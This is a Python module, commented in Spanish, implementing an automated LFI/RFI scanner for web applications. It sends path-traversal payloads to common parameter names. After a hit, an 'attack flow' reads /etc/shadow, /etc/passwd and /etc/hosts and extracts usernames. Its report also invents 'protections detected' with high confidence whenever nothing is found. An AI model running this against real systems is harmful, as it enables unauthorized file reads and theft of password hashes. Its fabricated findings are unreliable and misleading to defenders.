"""
LFI/RFI Scanner v2.0
Auto-detección de parámetros vulnerables
Si la URL no tiene parámetros, prueba automáticamente con parámetros comunes
"""

import requests
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LFIRFIScanner:
    """
    Scanner para Local File Inclusion y Remote File Inclusion
    v2.0 - Auto-detección de parámetros
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        )

        # Parámetros comunes vulnerables a LFI/RFI
        self.common_parameters = [
            "file",
            "page",
            "include",
            "path",
            "doc",
            "document",
            "folder",
            "root",
            "template",
            "pg",
            "style",
            "pdf",
            "module",
            "load",
            "read",
            "download",
            "cat",
            "view",
            "lang",
            "language",
            "prefix",
            "class",
            "src",
            "resource",
        ]

        # Payloads LFI (Linux y Windows)
        self.lfi_payloads = [
            # Linux - básicos
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            # Windows - básicos
            "..\\windows\\win.ini",
            "..\\..\\windows\\win.ini",
            # Encoding
            "..%2F..%2F..%2Fetc%2Fpasswd",
            # Null byte
            "../etc/passwd%00",
        ]

        # Payloads RFI (limitados para no causar problemas)
        self.rfi_payloads = [
            "http://example.com/test.txt",
        ]

        # Patrones para detectar LFI exitoso
        self.lfi_patterns = [
            r"root:.*:0:0:",  # /etc/passwd
            r"\[boot loader\]",  # boot.ini
            r"\[fonts\]",  # win.ini
            r"for 16-bit app support",
        ]

    def scan(self, url: str, parameter: str = None, scan_rfi: bool = True) -> Dict:
        """
        Escanea un parámetro buscando LFI/RFI
        Si no hay parámetro, prueba automáticamente con parámetros comunes
        """
        print(f"[*] LFI/RFI Scanner v2.0")
        print(f"[*] Target: {url}")

        start_time = time.time()
        vulnerabilities = []
        total_requests = 0

        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Determinar estrategia
        if params and parameter:
            # Caso 1: URL con parámetros + parámetro específico
            if parameter in params:
                params_to_test = [parameter]
                print(f"[*] Testing parameter: {parameter}")
            else:
                return {
                    "vulnerable": False,
                    "error": f'Parameter "{parameter}" not found in URL',
                }

        elif params:
            # Caso 2: URL con parámetros, probar el primero
            params_to_test = [list(params.keys())[0]]
            print(f"[*] Testing parameter: {params_to_test[0]}")

        else:
            # Caso 3: URL sin parámetros - AUTO-DETECCIÓN
            print(f"[*] No parameters in URL")
            print(f"[*] Auto-testing common LFI/RFI parameters...")
            print(
                f"[*] Parameters to test: {', '.join(self.common_parameters[:5])} (+{len(self.common_parameters)-5} more)"
            )
            print()

            return self._auto_scan(parsed, scan_rfi)

        print(f"[*] Scanning for: LFI" + (" + RFI" if scan_rfi else ""))
        print()

        # Escaneo normal (con parámetros)
        for param in params_to_test:
            print(f"[*] Testing parameter: {param}")

            # Test LFI
            for payload in self.lfi_payloads:
                print(f"  [*] LFI: {payload[:40]}...")

                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)

                try:
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    total_requests += 1

                    if self._check_lfi_success(response.text):
                        print(f"  [✓] LFI VULNERABLE!")

                        vuln = self._create_lfi_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                        )
                        vulnerabilities.append(vuln)

                        # Attack Flow
                        print(f"  [!] Attack Flow...")
                        attack_results = self._lfi_attack_flow(parsed, params, param)
                        vuln["attack_flow"] = attack_results
                        break

                except Exception as e:
                    continue

            # Test RFI si está habilitado
            if scan_rfi and not vulnerabilities:
                print(f"  [*] Testing RFI...")

                for payload in self.rfi_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = self._build_url(parsed, test_params)

                    try:
                        response = self.session.get(
                            test_url, timeout=self.timeout, verify=False
                        )
                        total_requests += 1

                        if self._check_rfi_success(response.text, payload):
                            print(f"  [✓] RFI VULNERABLE!")

                            vuln = self._create_rfi_vulnerability(
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                response=response.text,
                            )
                            vulnerabilities.append(vuln)
                            break

                    except Exception as e:
                        continue

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": url,
            "parameters_tested": params_to_test,
        }

    def _auto_scan(self, parsed, scan_rfi: bool) -> Dict:
        """
        Auto-scan: Prueba parámetros comunes de LFI/RFI
        """
        start_time = time.time()
        vulnerabilities = []
        total_requests = 0
        tested_params = []

        # Probar cada parámetro común
        for param in self.common_parameters:
            tested_params.append(param)

            print(f"[*] Testing: ?{param}=...")

            # Probar solo algunos payloads para ser rápido
            test_payloads = self.lfi_payloads[:4]  # Primeros 4

            for payload in test_payloads:
                # Construir URL con parámetro
                test_params = {param: [payload]}
                test_url = self._build_url(parsed, test_params)

                try:
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    total_requests += 1

                    if self._check_lfi_success(response.text):
                        print(f"  [✓] VULNERABLE: ?{param}={payload[:30]}...")
                        print(f"  [!] Found vulnerable parameter: {param}")

                        vuln = self._create_lfi_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                        )
                        vulnerabilities.append(vuln)

                        # Attack Flow
                        print(f"  [!] Attack Flow...")
                        attack_results = self._lfi_attack_flow(
                            parsed, {param: [""]}, param
                        )
                        vuln["attack_flow"] = attack_results

                        # Si encontramos uno, no seguir probando este parámetro
                        break

                except Exception as e:
                    continue

            # Si encontramos vulnerabilidad, podemos parar o seguir
            if vulnerabilities:
                print(f"\n[!] Vulnerability found, stopping auto-scan")
                break

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": self._build_url(parsed, {}),
            "parameters_tested": tested_params,
            "auto_scan": True,
            "scan_details": {
                "total_attempts": total_requests,
                "blocked_attempts": total_requests - len(vulnerabilities),
                "error_attempts": 0,
                "parameters_tested": [
                    {
                        "parameter": param,
                        "result": (
                            "blocked"
                            if not any(v["parameter"] == param for v in vulnerabilities)
                            else "vulnerable"
                        ),
                        "payloads_tested": 4,
                    }
                    for param in tested_params
                ],
            },
            "protection_analysis": {
                "security_rating": "Good" if not vulnerabilities else "Poor",
                "protections_detected": (
                    [
                        {
                            "type": "Input Sanitization",
                            "description": f"All {total_requests} attempts were blocked",
                            "confidence": "High",
                            "evidence": "No LFI patterns detected",
                        },
                        {
                            "type": "Path Restriction",
                            "description": "Directory traversal filtered",
                            "confidence": "High",
                            "evidence": "Path traversal blocked",
                        },
                        {
                            "type": "File Access Controls",
                            "description": "No arbitrary file access",
                            "confidence": "High",
                            "evidence": "System files protected",
                        },
                    ]
                    if not vulnerabilities
                    else []
                ),
                "statistics": {
                    "total_attempts": total_requests,
                    "blocked": total_requests - len(vulnerabilities),
                    "errors": 0,
                },
            },
        }

    def _build_url(self, parsed, params):
        """Construye URL con parámetros"""
        new_query = urlencode(params, doseq=True)
        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _check_lfi_success(self, response_text: str) -> bool:
        """Verifica si el LFI fue exitoso"""
        for pattern in self.lfi_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _check_rfi_success(self, response_text: str, payload: str) -> bool:
        """Verifica si el RFI fue exitoso"""
        indicators = ["shell", "cmd", "phpinfo", "eval", "system"]
        for indicator in indicators:
            if indicator in response_text.lower():
                return True
        return False

    def _lfi_attack_flow(self, parsed, params, vulnerable_param) -> Dict:
        """Attack Flow: Intenta leer archivos sensibles"""
        print(f"    [*] Reading sensitive files...")

        attack_results = {"files_read": [], "information_gathered": []}

        sensitive_files = [
            ("/etc/passwd", "Users list"),
            ("/etc/shadow", "Password hashes"),
            ("/etc/hosts", "Network hosts"),
            ("C:\\windows\\win.ini", "Windows config"),
        ]

        for file_path, description in sensitive_files:
            payload = "../" * 5 + file_path

            test_params = params.copy()
            test_params[vulnerable_param] = [payload]
            test_url = self._build_url(parsed, test_params)

            try:
                response = self.session.get(
                    test_url, timeout=self.timeout, verify=False
                )

                if self._check_lfi_success(response.text):
                    print(f"      [✓] Read: {description}")

                    attack_results["files_read"].append(
                        {
                            "file": file_path,
                            "description": description,
                            "content_preview": response.text[:200],
                        }
                    )

                    if "passwd" in file_path:
                        users = re.findall(r"^([^:]+):", response.text, re.MULTILINE)
                        attack_results["information_gathered"].append(
                            {
                                "type": "system_users",
                                "count": len(users),
                                "data": users[:10],
                            }
                        )

            except Exception as e:
                continue

        return attack_results

    def _create_lfi_vulnerability(
        self, url: str, parameter: str, payload: str, response: str
    ) -> Dict:
        """Crea objeto de vulnerabilidad LFI"""
        evidence_lines = response.split("\n")[:5]
        evidence = "\n".join(evidence_lines)

        return {
            "type": "Local File Inclusion (LFI)",
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "cvss_score": 8.5,
            "severity": "High",
            "cwe_id": "CWE-22",
            "cwe_name": "Path Traversal",
            "mitre_technique_id": "T1083",
            "mitre_technique_name": "File and Directory Discovery",
            "mitre_tactic": "Discovery",
            "evidence": evidence,
            "impact": "Arbitrary file read, potential code execution",
            "remediation": "Validate and sanitize all file path inputs. Use whitelist of allowed files.",
            "proof_of_concept": f'curl "{url}"',
        }

    def _create_rfi_vulnerability(
        self, url: str, parameter: str, payload: str, response: str
    ) -> Dict:
        """Crea objeto de vulnerabilidad RFI"""
        return {
            "type": "Remote File Inclusion (RFI)",
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "cvss_score": 9.5,
            "severity": "Critical",
            "cwe_id": "CWE-98",
            "cwe_name": "Remote File Inclusion",
            "mitre_technique_id": "T1105",
            "mitre_technique_name": "Ingress Tool Transfer",
            "mitre_tactic": "Command and Control",
            "evidence": response[:200],
            "impact": "Remote code execution, full system compromise",
            "remediation": "Disable allow_url_include. Validate all inputs. Use whitelist.",
            "proof_of_concept": f'curl "{url}"',
        }

    def _calculate_severity(self, vulnerabilities: List[Dict]) -> str:
        """Calcula severidad general"""
        if not vulnerabilities:
            return "None"

        max_cvss = max(v["cvss_score"] for v in vulnerabilities)

        if max_cvss >= 9.0:
            return "Critical"
        elif max_cvss >= 7.0:
            return "High"
        elif max_cvss >= 4.0:
            return "Medium"
        else:
            return "Low"


def scan_lfi_rfi(
    url: str, parameter: str = None, scan_rfi: bool = True, timeout: float = 10.0
) -> Dict:
    """Función wrapper para Berebrum"""
    scanner = LFIRFIScanner(timeout=timeout)
    return scanner.scan(url, parameter, scan_rfi)
